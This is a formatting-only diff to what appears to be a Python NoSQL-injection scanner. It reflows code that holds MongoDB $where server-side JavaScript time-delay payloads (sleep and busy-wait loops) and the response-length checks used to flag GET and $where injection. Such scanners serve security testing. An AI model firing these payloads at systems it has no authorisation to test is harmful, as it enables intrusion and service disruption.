@@ -90,16 +90,12 @@ WHERE_PAYLOADS = [
 SSJI_TIME_PAYLOADS = [
     ({"$where": "sleep(5000)"}, "SSJI_SLEEP", 4.0),
     (
-        {
-            "$where": "function() { var x = new Date(); while(new Date() - x < 5000); return true; }"
-        },
+        {"$where": "function() { var x = new Date(); while(new Date() - x < 5000); return true; }"},
         "SSJI_BUSY_WAIT",
         4.0,
     ),
     (
-        {
-            "$where": "(function(){var d=new Date();while(new Date()-d<5000){}return true;})()"
-        },
+        {"$where": "(function(){var d=new Date();while(new Date()-d<5000){}return true;})()"},
         "SSJI_IIFE_WAIT",
         4.0,
     ),
@@ -186,11 +182,7 @@ def _test_get_injection(target, endpoint, baseline_len):
             tolerance = max(baseline_len * 0.05, 50)
             diff_from_baseline = abs(resp_len - baseline_len)
 
-            if (
-                resp.status_code == 200
-                and resp_len > 100
-                and diff_from_baseline > tolerance
-            ):
+            if resp.status_code == 200 and resp_len > 100 and diff_from_baseline > tolerance:
                 vulns.append(
                     {
                         "tipo": "NOSQL_GET_INJECTION",
@@ -224,11 +216,7 @@ def _test_where_injection(target, endpoint, baseline_latency, baseline_len):
             tolerance = max(baseline_len * 0.05, 50)
             diff_from_baseline = abs(resp_len - baseline_len)
 
-            if (
-                resp.status_code == 200
-                and resp_len > 50
-                and diff_from_baseline > tolerance
-            ):
+            if resp.status_code == 200 and resp_len > 50 and diff_from_baseline > tolerance:
                 vulns.append(
                     {
                         "tipo": "NOSQL_WHERE_INJECTION",
